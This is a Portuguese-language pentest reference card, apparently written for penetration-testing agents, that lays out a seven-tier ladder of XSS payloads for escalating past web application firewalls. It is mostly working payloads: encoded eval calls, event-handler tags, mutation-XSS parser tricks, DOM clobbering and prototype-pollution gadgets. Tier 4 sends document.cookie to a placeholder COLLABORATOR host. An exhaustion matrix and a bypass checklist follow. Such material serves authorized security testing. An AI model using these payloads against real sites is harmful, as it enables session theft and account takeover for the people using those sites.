**TITULO=Detection Ladder XSS**
**CAMADA=Tecnica | FONTE=pentest-agents (H-mmer) | SEVERIDADE=Info | CWE=CWE-79 | TAGS=xss, detection, payloads, waf_bypass**

## Detection Token Rotation Ladder — 7 Tiers

Testar apenas alert(1) (Tier 1) perde ~70% dos XSS modernos.
A cada 3 tentativas sem execucao, subir um tier.

### Tier 1 — Basic (WAF espera)
```
alert(1)
alert(document.domain)
confirm(1)
prompt(1)
```

### Tier 2 — Encoded (WAF basico)
```
String.fromCharCode(97,108,101,114,116,40,49,41)
eval(atob('YWxlcnQoMSk='))
\u0061\u006c\u0065\u0072\u0074(1)
\x61\x6c\x65\x72\x74(1)
```

### Tier 3 — Event Handlers (WAF medio)
```
<img src=x onerror=eval(name)>
<svg onload=eval(name)>
<body onload=eval(name)>
<details open ontoggle=eval(name)>
```

### Tier 4 — Fetch/Exfil (testa execucao real)
```
fetch('https://COLLABORATOR/?c='+document.cookie)
new Image().src='https://COLLABORATOR/?c='+document.cookie
navigator.sendBeacon('https://COLLABORATOR/', document.cookie)
```

### Tier 5 — Parser Differentials (mXSS)
```
<math><mtext><table><mglyph><style><!--</style><img src onerror=alert(1)>
<svg><p><style><img src=x onerror=alert(1)></style></p></svg>
<form><button formaction=javascript:alert(1)>
<xml><script>alert(1)</script>
```

### Tier 6 — DOM Clobbering (CSP bypass)
```
<a id=defaultAvatar><a id=defaultAvatar name=src href="x:alert(1)">
<form id=config><input name=apiUrl value="javascript:alert(1)">
```

### Tier 7 — Prototype Pollution Gadgets
```
__proto__[innerHTML]=<img src=x onerror=alert(1)>
constructor[prototype][innerHTML]=<svg onload=alert(1)>
Object.prototype[innerHTML]=<img src=x onerror=alert(1)>
```

## Matrix de Exaustao XSS

Para declarar um vetor XSS como "limpo", testar combinacao de:

| Vetor | Encodings | Bypass |
|-------|-----------|--------|
| query param | raw | tag alternativo |
| path param | URL | event handler alt |
| JSON body | double URL | JS keyword alt |
| form data | Unicode | parser differential |
| header | HTML entity | DOM clobbering |
| multipart | base64 | prototype pollution |
| fragment | hex | polyglot |

Minimo: 5 vetores x 3 encodings x 2 bypasses = 30 tentativas viaveis.

## WAF Bypass Ladder (7 niveis)

1. **Encoding Transforms**: URL → HTML entity → Unicode → double URL
2. **Tag Alternatives**: script → img → svg → body → details → form → math
3. **Event Handler Alternatives**: onerror → onload → ontoggle → onfocus → onmouseover
4. **JS Execution Without Keywords**: eval → Function → setTimeout → setInterval → location
5. **Parser Differentials**: Namespace confusion → mutation → reparse
6. **Context-Specific Escapes**: JS string → template literal → attribute → CSS expression
7. **Infrastructure Bypasses**: HTTP/2 → connection reuse → chunked encoding
